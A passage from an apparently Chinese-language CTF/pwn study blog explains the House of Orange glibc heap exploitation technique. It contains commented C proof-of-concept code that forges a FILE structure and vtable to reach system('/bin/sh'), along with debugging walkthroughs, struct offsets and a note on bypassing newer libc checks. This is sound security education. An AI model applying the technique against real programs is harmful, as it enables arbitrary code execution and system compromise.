will flush all the file pointers by calling</span></span><br><span class="line"><span class="comment">      _IO_flush_all_lockp. Eventually, walking through the linked list in</span></span><br><span class="line"><span class="comment">      _IO_list_all and calling _IO_OVERFLOW on them.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      The idea is to overwrite the _IO_list_all pointer with a fake file pointer, whose</span></span><br><span class="line"><span class="comment">      _IO_OVERLOW points to system and whose first 8 bytes are set to &#x27;/bin/sh&#x27;, so</span></span><br><span class="line"><span class="comment">      that calling _IO_OVERFLOW(fp, EOF) translates to system(&#x27;/bin/sh&#x27;).</span></span><br><span class="line"><span class="comment">      More about file-pointer exploitation can be found here:</span></span><br><span class="line"><span class="comment">      https://outflux.net/blog/archives/2011/12/22/abusing-the-file-structure/</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      The address of the _IO_list_all can be calculated from the fd and bk of the free chunk, as they</span></span><br><span class="line"><span class="comment">      currently point to the libc&#x27;s main_arena.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    io_list_all = top[<span class="number">2</span>] + <span class="number">0x9a8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      We plan to overwrite the fd and bk pointers of the old top,</span></span><br><span class="line"><span class="comment">      which has now been added to the unsorted bins.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      When malloc tries to satisfy a request by splitting this free chunk</span></span><br><span class="line"><span class="comment">      the value at chunk-&gt;bk-&gt;fd gets overwritten with the address of the unsorted-bin-list</span></span><br><span class="line"><span class="comment">      in libc&#x27;s main_arena.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      Note that this overwrite occurs before the sanity check and therefore, will occur in any</span></span><br><span class="line"><span class="comment">      case.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      Here, we require that chunk-&gt;bk-&gt;fd to be the value of _IO_list_all.</span></span><br><span class="line"><span class="comment">      So, we should set chunk-&gt;bk to be _IO_list_all - 16</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"> </span><br><span class="line">    top[<span class="number">3</span>] = io_list_all - <span class="number">0x10</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      At the end, the system function will be invoked with the pointer to this file pointer.</span></span><br><span class="line"><span class="comment">      If we fill the first 8 bytes with /bin/sh, it is equivalent to system(/bin/sh)</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>( ( <span class="keyword">char</span> *) top, <span class="string">&quot;/bin/sh\x00&quot;</span>, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      The function _IO_flush_all_lockp iterates through the file pointer linked-list</span></span><br><span class="line"><span class="comment">      in _IO_list_all.</span></span><br><span class="line"><span class="comment">      Since we can only overwrite this address with main_arena&#x27;s unsorted-bin-list,</span></span><br><span class="line"><span class="comment">      the idea is to get control over the memory at the corresponding fd-ptr.</span></span><br><span class="line"><span class="comment">      The address of the next file pointer is located at base_address+0x68.</span></span><br><span class="line"><span class="comment">      This corresponds to smallbin-4, which holds all the smallbins of</span></span><br><span class="line"><span class="comment">      sizes between 90 and 98. For further information about the libc&#x27;s bin organisation</span></span><br><span class="line"><span class="comment">      see: https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      Since we overflow the old top chunk, we also control it&#x27;s size field.</span></span><br><span class="line"><span class="comment">      Here it gets a little bit tricky, currently the old top chunk is in the</span></span><br><span class="line"><span class="comment">      unsortedbin list. For each allocation, malloc tries to serve the chunks</span></span><br><span class="line"><span class="comment">      in this list first, therefore, iterates over the list.</span></span><br><span class="line"><span class="comment">      Furthermore, it will sort all non-fitting chunks into the corresponding bins.</span></span><br><span class="line"><span class="comment">      If we set the size to 0x61 (97) (prev_inuse bit has to be set)</span></span><br><span class="line"><span class="comment">      and trigger an non fitting smaller allocation, malloc will sort the old chunk into the</span></span><br><span class="line"><span class="comment">      smallbin-4. Since this bin is currently empty the old top chunk will be the new head,</span></span><br><span class="line"><span class="comment">      therefore, occupying the smallbin[4] location in the main_arena and</span></span><br><span class="line"><span class="comment">      eventually representing the fake file pointer&#x27;s fd-ptr.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      In addition to sorting, malloc will also perform certain size checks on them,</span></span><br><span class="line"><span class="comment">      so after sorting the old top chunk and following the bogus fd pointer</span></span><br><span class="line"><span class="comment">      to _IO_list_all, it will check the corresponding size field, detect</span></span><br><span class="line"><span class="comment">      that the size is smaller than MINSIZE &quot;size &lt;= 2 * SIZE_SZ&quot;</span></span><br><span class="line"><span class="comment">      and finally triggering the abort call that gets our chain rolling.</span></span><br><span class="line"><span class="comment">      Here is the corresponding code in the libc:</span></span><br><span class="line"><span class="comment">      https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#3717</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    top[<span class="number">1</span>] = <span class="number">0x61</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      Now comes the part where we satisfy the constraints on the fake file pointer</span></span><br><span class="line"><span class="comment">      required by the function _IO_flush_all_lockp and tested here:</span></span><br><span class="line"><span class="comment">      https://code.woboq.org/userspace/glibc/libio/genops.c.html#813</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      We want to satisfy the first condition:</span></span><br><span class="line"><span class="comment">      fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    FILE *fp = (FILE *) top;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      1. Set mode to 0: fp-&gt;_mode &lt;= 0</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    fp-&gt;_mode = <span class="number">0</span>; <span class="comment">// top+0xc0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      2. Set write_base to 2 and write_ptr to 3: fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    fp-&gt;_IO_write_base = (<span class="keyword">char</span> *) <span class="number">2</span>; <span class="comment">// top+0x20</span></span><br><span class="line">    fp-&gt;_IO_write_ptr = (<span class="keyword">char</span> *) <span class="number">3</span>; <span class="comment">// top+0x28</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      4) Finally set the jump table to controlled memory and place system there.</span></span><br><span class="line"><span class="comment">      The jump table pointer is right after the FILE struct:</span></span><br><span class="line"><span class="comment">      base_address+sizeof(FILE) = jump_table</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">         4-a)  _IO_OVERFLOW  calls the ptr at offset 3: jump_table+0x18 == winner</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> *jump_table = &amp;top[<span class="number">12</span>]; <span class="comment">// controlled memory</span></span><br><span class="line">    jump_table[<span class="number">3</span>] = (<span class="keyword">size_t</span>) &amp;winner;</span><br><span class="line">    *(<span class="keyword">size_t</span> *) ((<span class="keyword">size_t</span>) fp + <span class="keyword">sizeof</span>(FILE)) = (<span class="keyword">size_t</span>) jump_table; <span class="comment">// top+0xd8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Finally, trigger the whole chain by calling malloc */</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">   <span class="comment">/*</span></span><br><span class="line"><span class="comment">     The libc&#x27;s error message will be printed to the screen</span></span><br><span class="line"><span class="comment">     But you&#x27;ll get a shell anyways.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">winner</span><span class="params">(<span class="keyword">char</span> *ptr)</span></span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    system(ptr);</span><br><span class="line">    syscall(SYS_exit, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="运行结果及调试-13"><a href="#运行结果及调试-13" class="headerlink" title="运行结果及调试"></a>运行结果及调试</h2><p>首先分配一个chunk p1</p>
<p><img src="https://inews.gtimg.com/newsapp_ls/0/13540939340/0" alt="image-20210518215155746"></p>
<p>然后我们把top chunk的size伪造成0xc01</p>
<p><img src="https://inews.gtimg.com/newsapp_ls/0/13540948515/0" alt="image-20210518215457813"></p>
<p>下面申请一个较大的chunk p2</p>
<p><img src="https://inews.gtimg.com/newsapp_ls/0/13540950218/0" alt="image-20210518215527666"></p>
<p>这时候可以看到我们的旧top chunk被放入了unsorted bin中</p>
<p>紧接着计算IO_LIST_ALL的地址</p>
<p><img src="https://inews.gtimg.com/newsapp_ls/0/13540957544/0" alt="image-20210518215758179"></p>
<p>将旧的top chunk的bk指针指向_IO_list_all-0x10</p>
<p><img src="https://inews.gtimg.com/newsapp_ls/0/13540962338/0" alt="image-20210518215930176"></p>
<p>并且将其的前8个字节设为’/bin/sh\x00’</p>
<p><img src="https://inews.gtimg.com/newsapp_ls/0/13540965259/0" alt="image-20210518220026228"></p>
<p>然后将size改为0x61</p>
<p><img src="https://inews.gtimg.com/newsapp_ls/0/13540992827/0" alt="image-20210518220718133"></p>
<p>之后程序对我们的旧top chunk做了对绕过检测的改写，先将mode改为0</p>
<p><img src="https://inews.gtimg.com/newsapp_ls/0/13541013934/0" alt="image-20210518221251680"></p>
<p>然后修改_IO_write_base</p>
<p><img src="https://inews.gtimg.com/newsapp_ls/0/13541015739/0" alt="image-20210518221322671"></p>
<p>然后修改_IO_write_ptr</p>
<p><img src="https://inews.gtimg.com/newsapp_ls/0/13541018525/0" alt="image-20210518221413726"></p>
<p>然后修改我们的vtable，并且控制我们的jump_table</p>
<p><img src="https://inews.gtimg.com/newsapp_ls/0/13541032639/0" alt="image-20210518221815294"></p>
<p><img src="https://inews.gtimg.com/newsapp_ls/0/13541071688/0" alt="image-20210518223001421"></p>
<p>先将我们的jump_table伪造成0x40078f,然后赋值给我们的jump_table</p>
<p>现在再调用malloc因为会检测size,由于 size&lt;= 2*SIZE_SZ,所以会触发 _IO_flush_all_lockp 中的 _IO_OVERFLOW 函数，虽然继续报错,但我们还是 get shell了</p>
<h2 id="总结-13"><a href="#总结-13" class="headerlink" title="总结"></a>总结</h2><p>house of orange的运用一共有两个阶段</p>
<p>第一阶段是在不使用free的情况下获取我们的free chunk</p>
<p>第二个阶段是伪造我们的vtable</p>
<p>首先，程序写了一个winner函数，该函数作用就是调用system函数</p>
<p>然后程序申请了chunk p1(0x400-16)</p>
<p>此时系统的top chunk大小为0x20c01</p>
<p>因为top chunk需要页对齐并且其pre_inuse标志位始终为1，因此我们将size改成0xc01</p>
<p>现在申请一个0x1000的chunk，系统就会开一个新页来存储我们的新chunk，而我们的旧top chunk会被放入到unsorted bin中</p>
<p>有了unsorted bin，下面开始伪造file结构指针了</p>
<p>在第二阶段前，我们先将旧top chunk的size改为0x61</p>
<p>第二阶段中,程序先是把旧的top chunk-&gt;bk-&gt;fd指针指向了_io_list_ptr</p>
<p>为了绕过检测,我们首先要绕过两个检查</p>
<p>一个是mode必须为0,另一个是_write_base &lt; _write_ptr</p>
<p>所以程序将我们伪造的write_base改为2,write_ptr改为3</p>
<p>然后把我们的jump table指向winner函数，将top的前8个字节改成’/bin/sh’</p>
<p>最后让我们的vtable指向jump_table</p>
<p>现在再次调用malloc函数,由于size无法通过检测,因此,程序会终止调用,从而触发我们构造好的链</p>
<p>于是,程序输出错误信息的同时,我们也拿到了shell</p>
<p>几个疑惑的点：</p>
<p>关于0x61，在我们malloc之后，会在main_arena属于0x61大小的地方写上一个地址，就比如下图的0x602400</p>
<p><img src="https://inews.gtimg.com/newsapp_ls/0/13542337892/0" alt="image-20210519112041292"></p>
<p>为什么要在那个地方写个地址呢，因为我们在旧的top chunk的bk写上了_IO_list_all，这样malloc之后就会把IO_list_all的地址改成main_arena+88</p>
<p><img src="https://inews.gtimg.com/newsapp_ls/0/13542523398/0" alt="image-20210519120656219"></p>
<p>改完之后，这样对应的chain字段就会刚好是我们写了0x602400的地方，chain字段表示下一个IO结构</p>
<p><img src="https://inews.gtimg.com/newsapp_ls/0/13542526522/0" alt="image-20210519120748496"></p>
<p>在这个结构中，我们已经伪造好了我们需要的数据，vtable等等</p>
<p><img src="https://inews.gtimg.com/newsapp_ls/0/13542530059/0" alt="image-20210519120854705"></p>
<p>因为最后会触发IO_OVERFLOW函数，所以我们要在对应位置覆盖上我们的winner函数，IO_OVERFLOW应该是第4个(对应偏移下面会给出)，所以我们覆盖成如下</p>
<p><img src="https://inews.gtimg.com/newsapp_ls/0/13542537415/0" alt="image-20210519121126962"></p>
<p>偏移：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0x0</span>   _flags</span><br><span class="line"><span class="number">0x8</span>   _IO_read_ptr</span><br><span class="line"><span class="number">0x10</span>  _IO_read_end</span><br><span class="line"><span class="number">0x18</span>  _IO_read_base</span><br><span class="line"><span class="number">0x20</span>  _IO_write_base</span><br><span class="line"><span class="number">0x28</span>  _IO_write_ptr</span><br><span class="line"><span class="number">0x30</span>  _IO_write_end</span><br><span class="line"><span class="number">0x38</span>  _IO_buf_base</span><br><span class="line"><span class="number">0x40</span>  _IO_buf_end</span><br><span class="line"><span class="number">0x48</span>  _IO_save_base</span><br><span class="line"><span class="number">0x50</span>  _IO_backup_base</span><br><span class="line"><span class="number">0x58</span>  _IO_save_end</span><br><span class="line"><span class="number">0x60</span>  _markers</span><br><span class="line"><span class="number">0x68</span>  _chain</span><br><span class="line"><span class="number">0x70</span>  _fileno</span><br><span class="line"><span class="number">0x74</span>  _flags2</span><br><span class="line"><span class="number">0x78</span>  _old_offset</span><br><span class="line"><span class="number">0x80</span>  _cur_column</span><br><span class="line"><span class="number">0x82</span>  _vtable_offset</span><br><span class="line"><span class="number">0x83</span>  _shortbuf</span><br><span class="line"><span class="number">0x88</span>  _lock</span><br><span class="line"><span class="number">0x90</span>  _offset</span><br><span class="line"><span class="number">0x98</span>  _codecvt</span><br><span class="line"><span class="number">0xa0</span>  _wide_data</span><br><span class="line"><span class="number">0xa8</span>  _freeres_list</span><br><span class="line"><span class="number">0xb0</span>  _freeres_buf</span><br><span class="line"><span class="number">0xb8</span>  __pad5</span><br><span class="line"><span class="number">0xc0</span>  _mode</span><br><span class="line"><span class="number">0xc4</span>  _unused2</span><br><span class="line"><span class="number">0xd8</span>  vtable</span><br></pre></td></tr></table></figure>
<p>vtable：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> * funcs[] = &#123;</span><br><span class="line">   <span class="number">1</span> <span class="literal">NULL</span>, <span class="comment">// &quot;extra word&quot;</span></span><br><span class="line">   <span class="number">2</span> <span class="literal">NULL</span>, <span class="comment">// DUMMY</span></span><br><span class="line">   <span class="number">3</span> <span class="built_in">exit</span>, <span class="comment">// finish</span></span><br><span class="line">   <span class="number">4</span> <span class="literal">NULL</span>, <span class="comment">// overflow</span></span><br><span class="line">   <span class="number">5</span> <span class="literal">NULL</span>, <span class="comment">// underflow</span></span><br><span class="line">   <span class="number">6</span> <span class="literal">NULL</span>, <span class="comment">// uflow</span></span><br><span class="line">   <span class="number">7</span> <span class="literal">NULL</span>, <span class="comment">// pbackfail</span></span><br><span class="line">   </span><br><span class="line">   <span class="number">8</span> <span class="literal">NULL</span>, <span class="comment">// xsputn  #printf</span></span><br><span class="line">   <span class="number">9</span> <span class="literal">NULL</span>, <span class="comment">// xsgetn</span></span><br><span class="line">   <span class="number">10</span> <span class="literal">NULL</span>, <span class="comment">// seekoff</span></span><br><span class="line">   <span class="number">11</span> <span class="literal">NULL</span>, <span class="comment">// seekpos</span></span><br><span class="line">   <span class="number">12</span> <span class="literal">NULL</span>, <span class="comment">// setbuf</span></span><br><span class="line">   <span class="number">13</span> <span class="literal">NULL</span>, <span class="comment">// sync</span></span><br><span class="line">   <span class="number">14</span> <span class="literal">NULL</span>, <span class="comment">// doallocate</span></span><br><span class="line">   <span class="number">15</span> <span class="literal">NULL</span>, <span class="comment">// read</span></span><br><span class="line">   <span class="number">16</span> <span class="literal">NULL</span>, <span class="comment">// write</span></span><br><span class="line">   <span class="number">17</span> <span class="literal">NULL</span>, <span class="comment">// seek</span></span><br><span class="line">   <span class="number">18</span> pwn,  <span class="comment">// close</span></span><br><span class="line">   <span class="number">19</span> <span class="literal">NULL</span>, <span class="comment">// stat</span></span><br><span class="line">   <span class="number">20</span> <span class="literal">NULL</span>, <span class="comment">// showmanyc</span></span><br><span class="line">   <span class="number">21</span> <span class="literal">NULL</span>, <span class="comment">// imbue</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>在libc版本&gt;2.23后虽然加了检测机制,但我们依旧可以通过改 vtable为 _IO_str_jump来绕过检测,将偏移0xe0处设置为one_gadget即可</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">C7</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://billyotry.github.io/2021/05/10/%E3%80%90how2heap%E3%80%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">https://billyotry.github.io/2021/05/10/%E3%80%90how2heap%E3%80%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://billyotry.github.io" target="_blank">C7</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF-Pwn/">CTF/Pwn</a></div><div class="post_share"><div class="social-share" data-image="https://i.loli.net/2021/05/20/EbwjRFDSotqX95g.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/05/29/%E8%AE%BAORW%E7%9A%84%E5%A4%9A%E7%A7%8D%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF/"><img class="prev-cover" src="https://i.loli.net/2021/06/03/qOFcBw4g6tAjUEL.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">论ORW的多种利用姿势</div></div></a></div><div class="next-post pull-right"><a href="/2021/05/05/%E3%80%90Fuzzing%E3%80%91AFL%E5%88%9D%E6%8E%A2/"><img class="next-cover" src="https://i.loli.net/2021/05/05/m3SqwI27rgFd81N.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">【Fuzzing】AFL初探</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> 相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2021/01/22/[BJD2nd]r2t4/" title="[BJD2nd]r2t4"><img class="cover" src="https://i.loli.net/2020/03/25/jKDLeCc3NtMvzfd.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-01-22</div><div class="title">[BJD2nd]r2t4</div></div></a></div><div><a href="/2021/01/23/[Pwnable.tw]Tcache Tear/" title="[Pwnable.tw]Tcache Tear"><img class="cover" src="https://i.loli.net/2021/01/23/fDyEWaVJRgpPdOq.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-01-23</div><div class="title">[Pwnable.tw]Tcache Tear</div></div></a></div><div><a href="/2021/01/22/[WUSTCTF]closed/" title="[WUSTCTF]closed"><img class="cover" src="https://i.loli.net/2020/04/15/hPIey6tv8aC7xmo.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-01-22</div><div class="title">[WUSTCTF]closed</div></div></a></div><div><a href="/2021/01/29/[Pwnable.tw]bookwriter/" title="[Pwnable.tw]bookwriter"><img class="cover" src="https://i.loli.net/2021/01/23/fDyEWaVJRgpPdOq.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-01-29</div><div class="title">[Pwnable.tw]bookwriter</div></div></a></div><div><a href="/2021/01/22/【Glibc 源码分析】Glibc 2.23 -- malloc.c/" title="【Glibc 源码分析】Glibc 2.23 -- malloc.c"><img class="cover" src="https://i.loli.net/2021/06/03/qOFcBw4g6tAjUEL.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-01-22</div><div class="title">【Glibc 源码分析】Glibc 2.23 -- malloc.c</div></div></a></div><div><a href="/2021/01/22/[Confidence CTF]kvm/" title="[Confidence CTF]kvm"><img class="cover" src="https://i.loli.net/2020/10/05/OkMu26JEdRlGBqX.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-01-22</div><div class="title">[Confidence CTF]kvm</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-info-avatar is-center"><img class="avatar-img" src="/img/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">C7</div><div class="author-info__description">雖不能至 心嚮往之</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">49</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">12</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div></div><a class="button--animated" id="card-info-btn"><i class="fa fa-paper-plane-o"></i><span>加入书签</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/BillyoTry" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:1347405944@qq.com" target="_blank" title="Email"><i class="fa fa-envelope"></i></a><a class="social-icon" href="tencent://message/?uin=1347405944&amp;Site=&amp;Menu=yes" target="_blank" title=""><i class="fab fa-qq"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">大家疫情期间注意保护自己噢~~~~</div></div><div class="sticky_layout"><div class="card-widget card-clock" style="padding:0"><div class="card-glass"><div class="card-background"><div class="card-content"><div id="clock" style="padding:20px"><img v-if="clockshow == &quot;false&quot;" src="/clock/images/weather/loading.gif" style="height:120px;width:100%"/><table class="clock" v-if="clockshow"><tbody><tr><td class="clockdate">{{date}}</td><td class="weatherimg" align="center" valign="middle"><img id="weatherimg" :src="weatherimg"/></td><td class="temperature" align="center" valign="middle">{{temperature}}</td><td class="humidityimg"><img id="humidityimg" :src="humidityimg"/></td><td class="humidity">{{humidity}}</td></tr><tr class="time"><td colspan="5">{{time}}</td></tr><tr><td class="usaqi" colspan="1"> <span>{{ip}}</span></td><td class="city" colspan="2">{{city}}</td><td class="daylight" colspan="2">{{daylight}}</td></tr></tbody></table></div></div></div></div></div><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE"><span class="toc-number">1.</span> <span class="toc-text">前置</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-first-fit"><span class="toc-number">2.</span> <span class="toc-text">0x01 first-fit</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BA%90%E4%BB%A3%E7%A0%81"><span class="toc-number">2.1.</span> <span class="toc-text">源代码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E7%BB%93%E6%9E%9C%E5%8F%8A%E8%B0%83%E8%AF%95"><span class="toc-number">2.2.</span> <span class="toc-text">程序结果及调试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">2.3.</span> <span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-fastbin-dup"><span class="toc-number">3.</span> <span class="toc-text">0x02 fastbin_dup</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BA%90%E4%BB%A3%E7%A0%81-1"><span class="toc-number">3.1.</span> <span class="toc-text">源代码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%90%E8%A1%8C%E7%BB%93%E6%9E%9C%E5%8F%8A%E8%B0%83%E8%AF%95"><span class="toc-number">3.2.</span> <span class="toc-text">运行结果及调试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-1"><span class="toc-number">3.3.</span> <span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-fastbin-dup-consolidate"><span class="toc-number">4.</span> <span class="toc-text">0x03 fastbin_dup_consolidate</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BA%90%E4%BB%A3%E7%A0%81-2"><span class="toc-number">4.1.</span> <span class="toc-text">源代码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%90%E8%A1%8C%E7%BB%93%E6%9E%9C%E5%8F%8A%E8%B0%83%E8%AF%95-1"><span class="toc-number">4.2.</span> <span class="toc-text">运行结果及调试</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AE%E9%A2%98%EF%BC%9A%E8%BF%99%E4%B8%AA%E8%BF%87%E7%A8%8B%E5%88%B0%E5%BA%95%E5%8F%91%E7%94%9F%E4%BA%86%E4%BB%80%E4%B9%88%E5%91%A2"><span class="toc-number">4.2.1.</span> <span class="toc-text">问题：这个过程到底发生了什么呢</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-2"><span class="toc-number">4.3.</span> <span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-fastbin-dup-into-stack"><span class="toc-number">5.</span> <span class="toc-text">0x04 fastbin_dup_into_stack</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BA%90%E4%BB%A3%E7%A0%81-3"><span class="toc-number">5.1.</span> <span class="toc-text">源代码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%90%E8%A1%8C%E7%BB%93%E6%9E%9C%E5%8F%8A%E8%B0%83%E8%AF%95-2"><span class="toc-number">5.2.</span> <span class="toc-text">运行结果及调试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-3"><span class="toc-number">5.3.</span> <span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x05-unsafe-unlink"><span class="toc-number">6.</span> <span class="toc-text">0x05 unsafe_unlink</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BA%90%E4%BB%A3%E7%A0%81-4"><span class="toc-number">6.1.</span> <span class="toc-text">源代码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%90%E8%A1%8C%E7%BB%93%E6%9E%9C%E5%8F%8A%E8%B0%83%E8%AF%95-3"><span class="toc-number">6.2.</span> <span class="toc-text">运行结果及调试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-4"><span class="toc-number">6.3.</span> <span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x06-overlapping-chunks"><span class="toc-number">7.</span> <span class="toc-text">0x06 overlapping_chunks</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BA%90%E4%BB%A3%E7%A0%81-5"><span class="toc-number">7.1.</span> <span class="toc-text">源代码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%90%E8%A1%8C%E7%BB%93%E6%9E%9C%E5%8F%8A%E8%B0%83%E8%AF%95-4"><span class="toc-number">7.2.</span> <span class="toc-text">运行结果及调试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-5"><span class="toc-number">7.3.</span> <span class="toc-text">总结</span></a></li></ol></li><li 